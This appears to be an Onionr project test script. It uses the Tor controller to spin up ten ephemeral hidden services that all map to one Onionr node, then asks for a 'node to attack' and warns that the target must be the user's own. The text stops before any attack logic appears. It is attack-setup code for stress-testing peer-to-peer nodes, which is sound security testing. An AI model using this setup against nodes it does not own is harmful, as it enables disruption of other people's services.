import sys
import os
import stem

if not os.path.exists('onionr.sh'):
    os.chdir('../')
sys.path.append("src/")
from onionrutils import stringvalidators
from onionrutils import basicrequests

from stem.control import Controller

onionr_ip = input("onionr ip address: ")
onionr_port = int(input("Enter onionr public api port: "))

controller = Controller.from_port('127.0.0.1', int(input("Enter tor controller port: ")))
controller.authenticate()
for i in range(10):
    response = controller.create_ephemeral_hidden_service({80: f'{onionr_ip}:{onionr_port}'}, await_publication=True)
    print(response.service_id)



node = input("Enter node to attack. Note that you legally must use your own, and even that might lead to technical or legal issues")
assert stringvalidators.validate_transport(node)

